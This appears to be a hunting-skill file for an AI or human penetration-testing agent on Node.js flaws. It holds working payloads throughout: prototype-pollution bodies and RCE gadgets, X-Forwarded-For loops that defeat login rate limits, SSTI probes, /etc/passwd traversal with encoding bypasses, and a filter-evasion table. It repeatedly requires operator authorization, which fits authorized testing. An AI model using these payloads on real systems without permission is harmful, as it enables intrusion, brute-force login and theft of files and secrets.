---
name: nodejs
description: >
  Hunt for Node.js runtime weaknesses: prototype pollution escalating to RCE (gadget chains),
  trust-proxy / X-Forwarded-For IP spoofing (rate-limit and ACL bypass), code injection via
  eval/Function/vm, server-side template injection in pug/ejs/handlebars, and path traversal in
  static file serving (express.static, serve-static, sendFile). Use when the backend is Node
  (Express/Koa/Fastify/Nest), JSON bodies merge into objects, templates render user input, or
  static files are served from a user-influenced path. Keywords: nodejs, express, prototype
  pollution, __proto__, trust proxy, x-forwarded-for spoof, eval injection, vm2, ssti pug ejs
  handlebars, path traversal, serve-static, sendFile, child_process.
  Do NOT use for Next.js-specific issues (use nextjs) or language-agnostic SSTI theory alone (this
  is the Node template/engine surface). For pure prototype-pollution theory see prototype-pollution.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-1321, CWE-94, CWE-95, CWE-22, CWE-290]
  mitre_attack: [T1190, T1059.007, T1083]
  tools: [curl, burp, nodejs, ppmap, tplmap]
depends_on: [active-recon, tech-stack-fingerprint, fuzzing]
feeds_into: [chain-analysis, rce, info-disclosure]
chains_with: [prototype-pollution, ssti, rce, rate-limiting, lfi-rfi]
---

## Signals

- JSON/merge-heavy APIs: endpoints that deep-merge request bodies into config/options objects
  (`Object.assign`, `_.merge`, `_.defaultsDeep`, `Object.assign({}, defaults, req.body)`), or
  query parsers that build nested objects from `a[b][c]=d`.
- Express/Koa/Fastify/Nest fingerprints: `X-Powered-By: Express`, `ETag` weak hashes, 404 page
  "Cannot GET /x", stack traces mentioning `node_modules`, `at Object.<anonymous>`.
- A reverse proxy in front and the app reading `req.ip`/`X-Forwarded-For` for rate limiting,
  geofencing, or ACLs — `app.set('trust proxy', true)` set too broadly.
- Template engines in responses or deps: pug/jade, ejs, handlebars, nunjucks, dot, lodash
  templates; user input landing inside a rendered template (profile name, error page, email).
- Static serving: `express.static`, `res.sendFile(userPath)`, download endpoints taking a
  `file`/`path`/`name` param.

## Prerequisites

- An input that reaches object construction (for prototype pollution), a template render (SSTI),
  an eval-like sink, or a filesystem path (traversal) — identified from behaviour, errors, or
  source if available (overlaps sast).
- For prototype-pollution→RCE: knowledge of a reachable gadget (the app spawns a child process,
  renders a template after pollution, or re-reads a polluted config). Pollution alone is not RCE.
- For IP spoofing: a server-side decision keyed on client IP (rate limit counter, allowlist) to
  observe the effect of a forged header.

## Methodology

1. **Prototype pollution probe.** Try to set a property on `Object.prototype` and observe a
   global side effect on a *subsequent* request (pollution persists on the shared prototype):
   ```bash
   # JSON body merge sink
   curl -s -X POST https://target/api/profile -H 'Content-Type: application/json' \
     -d '{"__proto__":{"polluted":"yes"}}'
   # query/bracket parser sink (qs): __proto__[polluted]=yes  or  constructor[prototype][polluted]=yes
   curl -s "https://target/api/search?__proto__[polluted]=yes"
   # detect: a reflected/behavioral change that only a polluted Object.prototype explains
   curl -s https://target/api/profile   # does an unrelated response now carry "polluted"/change defaults?
   ```
   Confirm the property leaks into an object the app did not set it on — that is pollution, not
   normal assignment.

2. **Escalate pollution to RCE via a real gadget.** Do not claim RCE from pollution alone — find a
   sink that consumes a polluted property. Common Node gadgets:
   ```bash
   # child_process spawn reads options from a polluted prototype (e.g. shell/NODE_OPTIONS/env)
   curl -s -X POST https://target/api/x -H 'Content-Type: application/json' \
     -d '{"__proto__":{"shell":"/bin/sh","argv0":"..."}}'
   # template-engine gadget: pollute a block/compiler option, then trigger a render (OOB/sleep oracle)
   curl -s -X POST https://target/api/x -H 'Content-Type: application/json' \
     -d '{"__proto__":{"<engine-specific-option>":"<payload>"}}'
   ```
   Prove execution with an OOB callback (mint a token first) or a reliable timing delta; a reflected
   `polluted` string proves pollution, not code execution.

3. **trust proxy / X-Forwarded-For spoofing.** If the app trusts the header for IP-keyed logic,
   forge it to reset counters or bypass an allowlist:
   ```bash
   # rate-limit reset: rotate the apparent client IP per request
   for i in $(seq 1 20); do
     curl -s -o /dev/null -w "%{http_code}\n" https://target/api/login \
       -H "X-Forwarded-For: 10.0.0.$i" -d '{"user":"a","pass":"b"}' -H 'Content-Type: application/json'
   done
   # ACL/geo bypass: assert an allowed internal/office IP
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin -H 'X-Forwarded-For: 127.0.0.1'
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin -H 'X-Forwarded-For: 10.0.0.1, 1.1.1.1'
   ```
   Compare against the baseline (no header). A counter that never trips, or an allowlisted route
   that opens, confirms the header is trusted (overlaps rate-limiting / host-header).

4. **Code injection via eval/Function/vm.** Where input reaches a JS evaluator (calculators,
   rule/filter DSLs, `vm`/`vm2` sandboxes, formula fields):
   ```bash
   # arithmetic oracle first (safe, non-destructive)
   curl -s "https://target/api/calc?expr=7*7"      # returns 49 => expression evaluated
   # sandbox-escape / RCE only behind an explicit gate; prove with OOB, not a blind shell
   # vm2 historically escapable; confirm the engine and version before claiming escape
   ```
   Start with a pure-computation oracle (`7*7`→`49`); escalate to process access only with operator
   authorization.

5. **SSTI in pug/ejs/handlebars/nunjucks.** Identify the engine, then use its own syntax — the
   braces differ per engine, so fingerprint before firing:
   ```bash
   # engine-agnostic probe to see which delimiters render
   curl -s "https://target/page?name=\${7*7}"        # ES-template / some engines
   curl -s "https://target/page?name=#{7*7}"         # pug interpolation
   curl -s "https://target/page?name={{7*7}}"        # handlebars/nunjucks/mustache-family
   curl -s "https://target/page?name=<%= 7*7 %>"     # ejs
   # a rendered 49 identifies the engine; then use engine-specific gadget to reach require/process
   ```
   `49` in the output identifies the engine; follow the ssti skill for the engine-specific path to
   `process`/`require` (handlebars needs helper/constructor gadgets; pug/ejs allow inline JS).

6. **Path traversal in static/download serving.** Where a filename maps to the filesystem:
   ```bash
   curl -s "https://target/download?file=../../../../etc/passwd"
   curl -s "https://target/download?file=..%2f..%2f..%2fetc%2fpasswd"      # url-encoded
   curl -s "https://target/download?file=..%252f..%252fetc%252fpasswd"     # double-encoded
   curl -s --path-as-is "https://target/static/..%5c..%5cwindows%5cwin.ini" # backslash on Windows
   # express.static is generally safe for decoded ../, but res.sendFile(userInput) and custom
   # joins are not — test the actual decoded path reaching fs
   ```
   A real `root:x:0:0` / `[extensions]` body is Demonstrated; a 400/403 is tested-and-safe.

7. **Confirm the primitive and stop at the gate.** Record exactly which sink (pollution, IP trust,
   eval, SSTI, traversal) and the proven impact. Turning pollution/SSTI into a full shell, or
   reading beyond a proof file, crosses a scope boundary — get the operator gate.

## Tooling

- `curl` / Burp Repeater — precise header forging (XFF) and body shaping (`__proto__`).
- `ppmap` / Burp "prototype pollution" checks — detect client/server pollution candidates
  (verify manually; many hits are reflected-only, not RCE).
- `tplmap` — SSTI engine detection and exploitation (confirm the engine it reports; verify flags
  with `-h` per CLI anti-hallucination).
- `interactsh` / `engine.oast` — OOB confirmation for blind pollution-gadget / eval execution.
- `node -e` locally — reproduce a suspected gadget chain against the same library version before
  claiming it works on the target.

## Root Causes

- Recursive merge/clone over attacker-controlled keys without rejecting `__proto__`,
  `constructor`, `prototype` (lodash `merge`, hand-rolled deep-merge, `qs` nested parsing).
- A pollutable property later consumed by a dangerous sink (child_process options, template
  compiler flags, config re-read) — the gadget, not the pollution, is the RCE.
- `trust proxy` enabled broadly so a client-supplied `X-Forwarded-For` becomes `req.ip`, which
  then keys security decisions.
- User input concatenated into `eval`/`new Function`/`vm` code, or into a template string that the
  engine compiles (SSTI) instead of being passed as data.
- Filesystem path built by joining user input to a root without canonicalizing and confining
  (`sendFile`/custom joins rather than hardened static middleware).

## Validation Gate (minimum proof)

- **Demonstrated:** a polluted property observed on an object the app never set it on AND a
  gadget-driven effect (OOB callback or timing from the sink) for RCE claims; a forged XFF that
  demonstrably resets a rate limiter or opens an IP-gated route; `7*7`→`49` through an eval/SSTI
  sink with the engine named; or a real sensitive file body via traversal. Payload + evidence.
- **Inferred:** pollution reflected back (`polluted` appears) but no gadget reached — pollution
  proven, RCE pending; a single XFF-keyed timing/behaviour blip not yet repeated; an SSTI probe
  that errors in an engine-specific way but hasn't rendered arithmetic.
- **Unproven:** "uses lodash, so prototype pollution" or "has a template engine, so SSTI" with no
  payload changing output. "vm2 is in package.json" without a reproduced escape. Do not report.
- Name the sink precisely (pollution gadget vs. eval vs. engine-specific SSTI vs. sendFile
  traversal) — fixes are entirely different.

## Payloads & Detection Patterns

Guía de caza: una familia por sink de Node. Para ejecución ciega (gadget de pollution, eval), el
único camino a `Demonstrated` es un hit correlacionado por token en el gate OOB, no un string
reflejado.

| Categoría | Shape | Propósito |
|---|---|---|
| Proto pollution (JSON) | `{"__proto__":{"polluted":"yes"}}` | Contaminar `Object.prototype` compartido |
| Proto pollution (qs) | `?__proto__[polluted]=yes`, `?constructor[prototype][x]=y` | Mismo efecto vía parser bracket |
| Pollution→RCE gadget | `{"__proto__":{"shell":"/bin/sh"}}` + trigger de spawn/render | Escalar a ejecución por sink real |
| XFF spoof | header `X-Forwarded-For: 127.0.0.1` / IP rotada | Bypass de rate-limit / ACL por IP |
| Eval oracle | `?expr=7*7` → `49` | Confirmar evaluación de expresión |
| SSTI por engine | pug `#{7*7}`, ejs `<%= 7*7 %>`, hbs `{{7*7}}` | Identificar engine y render de código |
| Path traversal | `?file=../../../../etc/passwd`, `..%252f` | Leer FS fuera del root servido |

Surface signals que delatan la clase antes de inyectar:
- URL/body: claves `__proto__`/`constructor`/`prototype`; params `expr`/`formula`/`template`;
  params `file`/`path`/`name` en descargas.
- JS/deps: `lodash.merge`, `Object.assign(... req.body)`, `pug`/`ejs`/`handlebars`, `vm2`,
  `child_process`.
- Headers: `X-Powered-By: Express`, trazas con `node_modules`, `trust proxy` inferido por respeto a XFF.

```bash
# pollution: contamina y verifica el efecto en una request posterior no relacionada
curl -s -X POST https://target/api/profile -H 'Content-Type: application/json' \
  -d '{"__proto__":{"qzmark":"'$RANDOM'"}}'
curl -s https://target/api/other | grep -o 'qzmark'   # aparece donde nadie lo seteó = pollution
```

```bash
# XFF spoof: ¿el rate-limit cuenta por IP forjada? 20 intentos, misma IP vs IP rotada
for ip in $(yes 9.9.9.9 | head -20); do
  curl -s -o /dev/null -w "%{http_code} " https://target/api/login \
    -H "X-Forwarded-For: $ip" -d '{"user":"a","pass":"b"}' -H 'Content-Type: application/json'
done; echo   # si nunca aparece 429, revisa con IP rotada; divergencia = XFF confiado
```

```bash
# SSTI: dispara delimitadores por engine y busca 49 renderizado
for p in '#{7*7}' '<%= 7*7 %>' '{{7*7}}' '${7*7}'; do
  echo "== $p =="; curl -s "https://target/page?name=$p" | grep -o '49' | head -1
done
```

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| Bloqueo literal de `__proto__` | Usar `constructor[prototype][x]`; clave en objeto anidado, no string | Mismo efecto, distinta ruta de acceso |
| Merge que ignora un nivel | Anidar más profundo o usar array wrapper | Depende de la implementación del deep-merge |
| XFF ignorado (lee solo primer hop) | `X-Real-IP`, `X-Client-IP`, `Forwarded: for=`, o IP al final de la lista XFF | `trust proxy` numérico elige un índice distinto |
| SSTI con sandbox del engine | Gadget `constructor.constructor` (handlebars), `process`/`require` inline (pug/ejs) | La sintaxis del escape depende del engine |
| Traversal con decode simple | Doble-encode `..%252f`, overlong, backslash `..%5c`, `....//` | El filtro decodifica una sola vez |
| `express.static` endurecido | Buscar el `sendFile`/join custom aparte, no el static middleware | El static oficial suele estar a salvo del `../` decodificado |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Prototype pollution → RCE gadget** — Is there a reachable spawn/template/config-read sink that
   consumes a polluted property? Chain rce only with authorization and an OOB proof.
2. **XFF spoof → rate-limiting / auth-bypass** — Does resetting the IP counter enable credential
   brute force, or does an IP allowlist gate an admin/internal route?
3. **SSTI → rce / info-disclosure** — Can the engine reach `process.env` (secrets) or `require`
   (command exec)? Gate before a real shell.
4. **Path traversal → info-disclosure / credential reuse** — Reach `.env`, config, SSH keys, source;
   leaked secrets feed credential-testing.
5. **eval sink → sandbox escape** — If `vm`/`vm2`, probe a known-version escape only under an
   explicit gate.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Prototype pollution → **prototype-pollution** gadget → **rce** (spawn/template compiler) — gate
  required.
- XFF spoofing → **rate-limiting** bypass → **credential-testing** brute force; or IP-allowlist →
  **auth-bypass** / **broken-access-control**.
- SSTI (pug/ejs) → **ssti** → **rce** or **info-disclosure** (`process.env` secrets).
- Path traversal → **lfi-rfi** / **info-disclosure** → **credential-testing** with leaked `.env`.
- eval/`vm` injection → **rce** (sandbox escape) — new scope boundary.

## Gotchas

- **Pollution ≠ RCE.** A reflected `polluted` property proves pollution only. RCE requires a named,
  reachable gadget plus an OOB/timing proof of execution — otherwise cap at Inferred.
- **XFF trust depends on `trust proxy` config.** With a numeric `trust proxy`, Express picks the Nth
  hop from the right; your forged value may be overwritten by the real proxy. Test which position is
  trusted (prepend vs. append) and confirm the security decision actually moved.
- **SSTI delimiters are engine-specific.** `{{7*7}}` does nothing in pug; `#{7*7}` does nothing in
  handlebars. Fingerprint the engine first; a non-rendering probe is not proof of safety for the
  *right* engine.
- **Common N/A:** `express.static` serving decoded `../` — the official middleware normalizes and
  confines; traversal usually lives in a custom `sendFile(join(root, req.query.file))` instead.
- **Overclaim trap:** `7*7`→`49` proves expression evaluation, not shell access. Don't jump from an
  arithmetic oracle to "RCE" without the process-level step and a gate.
- **vm2 claims need a reproduced escape.** Its presence in deps is Unproven; reproduce the escape
  against the pinned version locally before asserting it on the target.
